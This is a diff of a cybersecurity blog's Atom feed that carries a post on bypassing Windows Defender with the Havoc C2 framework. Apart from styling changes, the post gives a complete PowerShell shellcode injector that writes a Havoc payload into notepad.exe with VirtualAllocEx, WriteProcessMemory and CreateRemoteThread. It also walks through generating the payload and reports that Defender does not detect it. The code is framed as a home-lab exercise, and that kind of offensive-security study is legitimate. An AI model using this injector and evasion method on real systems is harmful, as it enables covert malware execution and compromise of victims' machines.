@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-27T22:29:19-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Bypassing Windows Defender with Havoc and PowerShell</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html" rel="alternate" type="text/html" title="Bypassing Windows Defender with Havoc and PowerShell" /><published>2025-05-27T00:00:00-04:00</published><updated>2025-05-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/27/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*1qYApM8pnZUqDjWT" alt="Set up Listener" width="400" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-28T09:28:13-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Bypassing Windows Defender with Havoc and PowerShell</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html" rel="alternate" type="text/html" title="Bypassing Windows Defender with Havoc and PowerShell" /><published>2025-05-27T00:00:00-04:00</published><updated>2025-05-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/27/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*1qYApM8pnZUqDjWT" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <h2 id="why-this-is-important">Why This Is Important</h2>
 
@@ -22,7 +22,7 @@
 
 <p>Before we can interact with a compromised system, create a listener in Havoc.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*G35qOwuk5E7uy6zHmEbPeQ.png" alt="Set up Listener" /></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*G35qOwuk5E7uy6zHmEbPeQ.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 900px;" /></p>
 
 <hr />
 
@@ -40,7 +40,7 @@
 
 <p>Click <strong>Generate</strong> to build the shellcode.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ONb86uyTlmEaxNWJYA1dnQ.png" alt="Generate Payload" /></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ONb86uyTlmEaxNWJYA1dnQ.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 600px;" /></p>
 
 <hr />
 
@@ -48,7 +48,7 @@
 
 <p>Copy the generated <code class="language-plaintext highlighter-rouge">.bin</code> file (e.g., <code class="language-plaintext highlighter-rouge">demon.x64.bin</code>) to your Windows VM target.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*r9xsoiWwCvxKXV7fo1FEfA.png" alt="Transfer Shellcode" /></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*r9xsoiWwCvxKXV7fo1FEfA.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
 
 <hr />
 
@@ -63,8 +63,9 @@
 
 <p>Even then, the shellcode placed in <code class="language-plaintext highlighter-rouge">C:\Users\lab\Downloads</code> goes undetected.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*HSABF2KK1880mOS0veLs9A.png" alt="Defender Enabled" /><br />
-<img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*icefKTOqwcIWWhURQR3g9g.png" alt="No Detection" /></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*HSABF2KK1880mOS0veLs9A.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*icefKTOqwcIWWhURQR3g9g.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
 
 <hr />
 
@@ -72,17 +73,25 @@
 
 <p>Save this script as <code class="language-plaintext highlighter-rouge">injector.ps1</code> to inject shellcode into <code class="language-plaintext highlighter-rouge">notepad.exe</code>:</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Path to your shellcode file</span><span class="w">
-</span><span class="nv">$shellcodePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\lab\Downloads\demon.x64.bin"</span><span class="w">
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+# Path to your shellcode file
+$shellcodePath = "C:\Users\lab\Downloads\demon.x64.bin"
 
-</span><span class="c"># Read shellcode bytes</span><span class="w">
-</span><span class="nv">$shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$shellcodePath</span><span class="p">)</span><span class="w">
+# Read shellcode bytes
+$shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)
 
-</span><span class="c"># Start 64-bit notepad process</span><span class="w">
-</span><span class="nv">$proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">"C:\Windows\System32\notepad.exe"</span><span class="w"> </span><span class="nt">-PassThru</span><span class="w">
+# Start 64-bit notepad process
+$proc = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -PassThru
 
-</span><span class="c"># Define Win32 API calls</span><span class="w">
-</span><span class="n">Add-Type</span><span class="w"> </span><span class="sh">@"
+# Define Win32 API calls
+Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -121,35 +130,37 @@ public class Win32 {
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
 }
-"@</span><span class="w">
+"@
 
-</span><span class="c"># Open the target process with full access</span><span class="w">
-</span><span class="nv">$processHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">OpenProcess</span><span class="p">([</span><span class="n">Win32</span><span class="o">+</span><span class="n">ProcessAccessFlags</span><span class="p">]::</span><span class="n">All</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nv">$proc</span><span class="o">.</span><span class="nf">Id</span><span class="p">)</span><span class="w">
+# Open the target process with full access
+$processHandle = [Win32]::OpenProcess([Win32+ProcessAccessFlags]::All, $false, $proc.Id)
 
-</span><span class="c"># Allocate memory in the target process</span><span class="w">
-</span><span class="nv">$allocatedMemory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="nv">$processHandle</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="nv">$shellcode</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="o">+</span><span class="n">AllocationType</span><span class="p">]::</span><span class="nx">Commit</span><span class="w"> </span><span class="o">-bor</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="o">+</span><span class="n">AllocationType</span><span class="p">]::</span><span class="nx">Reserve</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="o">+</span><span class="n">MemoryProtection</span><span class="p">]::</span><span class="nx">ExecuteReadWrite</span><span class="p">)</span><span class="w">
+# Allocate memory in the target process
+$allocatedMemory = [Win32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, $shellcode.Length, [Win32+AllocationType]::Commit -bor [Win32+AllocationType]::Reserve, [Win32+MemoryProtection]::ExecuteReadWrite)
 
-</span><span class="c"># Write shellcode into the allocated memory</span><span class="w">
-</span><span class="nv">$outSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">UIntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="w">
-</span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="nv">$processHandle</span><span class="p">,</span><span class="w"> </span><span class="nv">$allocatedMemory</span><span class="p">,</span><span class="w"> </span><span class="nv">$shellcode</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="nv">$shellcode</span><span class="o">.</span><span class="nf">Length</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$outSize</span><span class="p">)</span><span class="w">
+# Write shellcode into the allocated memory
+$outSize = [UIntPtr]::Zero
+$result = [Win32]::WriteProcessMemory($processHandle, $allocatedMemory, $shellcode, [uint32]$shellcode.Length, [ref]$outSize)
 
-</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="nv">$result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="n">Write-Error</span><span class="w"> </span><span class="s2">"Failed to write shellcode into process memory"</span><span class="w">
-    </span><span class="kr">exit</span><span class="w"> </span><span class="mi">1</span><span class="w">
-</span><span class="p">}</span><span class="w">
+if (-not $result) {
+    Write-Error "Failed to write shellcode into process memory"
+    exit 1
+}
 
-</span><span class="c"># Create remote thread to execute shellcode</span><span class="w">
-</span><span class="nv">$threadId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
-</span><span class="nv">$remoteThread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">CreateRemoteThread</span><span class="p">(</span><span class="nv">$processHandle</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$allocatedMemory</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$threadId</span><span class="p">)</span><span class="w">
+# Create remote thread to execute shellcode
+$threadId = 0
+$remoteThread = [Win32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [ref]$threadId)
 
-</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$remoteThread</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="n">Write-Error</span><span class="w"> </span><span class="s2">"Failed to create remote thread"</span><span class="w">
-    </span><span class="kr">exit</span><span class="w"> </span><span class="mi">1</span><span class="w">
-</span><span class="p">}</span><span class="w">
+if ($remoteThread -eq [IntPtr]::Zero) {
+    Write-Error "Failed to create remote thread"
+    exit 1
+}
 
-</span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Shellcode injected successfully! Process ID: </span><span class="si">$(</span><span class="nv">$proc</span><span class="o">.</span><span class="nf">Id</span><span class="si">)</span><span class="s2">, Thread ID: </span><span class="nv">$threadId</span><span class="s2">"</span><span class="w">
+Write-Host "Shellcode injected successfully! Process ID: $($proc.Id), Thread ID: $threadId"
 
-</span></code></pre></div></div>
+  </code></pre>
+</div>
+
 <h3 id="6-run-the-injector">6. Run the Injector</h3>
 
 <p>Run the PowerShell script. If all goes well:</p>
@@ -166,7 +177,7 @@ public class Win32 {
   </li>
 </ul>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*wgh_KLEH-IBByxykk7zCuQ.gif" alt="Shellcode Injection" /></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*wgh_KLEH-IBByxykk7zCuQ.gif" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
 
 <hr />
 
@@ -180,9 +191,18 @@ public class Win32 {
 
 <h3 id="step-1-load-the-shellcode">Step 1: Load the Shellcode</h3>
 
-<p><code class="language-plaintext highlighter-rouge">$shellcodePath = "C:\Users\lab\Downloads\demon.x64.bin" $shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)</code></p>
+<p><code class="language-plaintext highlighter-rouge">$shellcodePath = "C:\Users\lab\Downloads\demon.x64.bin"</code><br />
+<code class="language-plaintext highlighter-rouge">$shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)</code></p>
 
-<p>You’ve got a <code class="language-plaintext highlighter-rouge">.bin</code> file with raw shellcode, We load the bytes into memory. It’s just a raw byte array at this point.</p>
+<ul>
+  <li>
+    <p><strong>What it does</strong>: Reads raw shellcode bytes from a binary file.</p>
+
+    <ul>
+      <li><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.file.readallbytes">Microsoft - File.ReadAllBytes Method</a></li>
+    </ul>
+  </li>
+</ul>
 
 <hr />
 
@@ -194,7 +214,7 @@ public class Win32 {
 
 <hr />
 
-<h3 id="-step-3-load-the-native-win32-api">🔧 Step 3: Load the Native Win32 API</h3>
+<h3 id="step-3-load-the-native-win32-api">Step 3: Load the Native Win32 API</h3>
 
 <p>This big block here is C# code embedded in PowerShell. Using <code class="language-plaintext highlighter-rouge">Add-Type</code>, we define all the low-level Win32 functions we’ll need:</p>
 
@@ -221,7 +241,16 @@ public class Win32 {
 
 <p><code class="language-plaintext highlighter-rouge">$processHandle = [Win32]::OpenProcess([Win32+ProcessAccessFlags]::All, $false, $proc.Id)</code></p>
 
-<p>We grab a handle to the Notepad process with full access. This is the equivalent of getting a master key to its memory.</p>
+<ul>
+  <li>
+    <p>Opens a handle to the notepad process with full access rights.</p>
+  </li>
+  <li>
+    <p><strong>Access rights</strong> include the ability to read/write memory, create threads, etc.</p>
+  </li>
+</ul>
+
+<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess function - Microsoft Docs</a></p>
 
 <hr />
 
@@ -229,7 +258,25 @@ public class Win32 {
 
 <p><code class="language-plaintext highlighter-rouge">$allocatedMemory = [Win32]::VirtualAllocEx(..., [Win32+MemoryProtection]::ExecuteReadWrite)</code></p>
 
-<p>We reserve a chunk of memory in Notepad’s address space. We mark it as executable so we can run our shellcode once it’s in there.</p>
+<ul>
+  <li>
+    <p>Allocates memory in the <strong>remote</strong> process (notepad).</p>
+  </li>
+  <li>
+    <p>Flags used:</p>
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">Commit | Reserve</code>: Allocate and commit memory</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">ExecuteReadWrite</code>: Allow execution of code from this memory</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx function</a></p>
 
 <hr />
 
@@ -237,7 +284,13 @@ public class Win32 {
 
 <p><code class="language-plaintext highlighter-rouge">$result = [Win32]::WriteProcessMemory($processHandle, $allocatedMemory, $shellcode, ...)</code></p>
 
-<p>This is where the magic happens we inject our shellcode into the newly allocated space. At this point, it’s just data sitting in memory… not running yet.</p>
+<ul>
+  <li>Writes the raw shellcode into the allocated memory of the target process.</li>
+</ul>
+
+<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory function</a></p>
+
+<hr />
 
 <hr />
 
@@ -245,7 +298,16 @@ public class Win32 {
 
 <p><code class="language-plaintext highlighter-rouge">$remoteThread = [Win32]::CreateRemoteThread($processHandle, ..., $allocatedMemory, ...)</code></p>
 
-<p>Boom. We spawn a remote thread inside Notepad that starts executing at the address of our shellcode. Notepad is now doing things it definitely wasn’t built to do.</p>
+<ul>
+  <li>
+    <p>Starts a new thread <strong>inside notepad.exe</strong>, with the <strong>start address pointing to your shellcode</strong>.</p>
+  </li>
+  <li>
+    <p>This is the moment the shellcode begins executing.</p>
+  </li>
+</ul>
+
+<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread function</a></p>
 
 <hr />
 
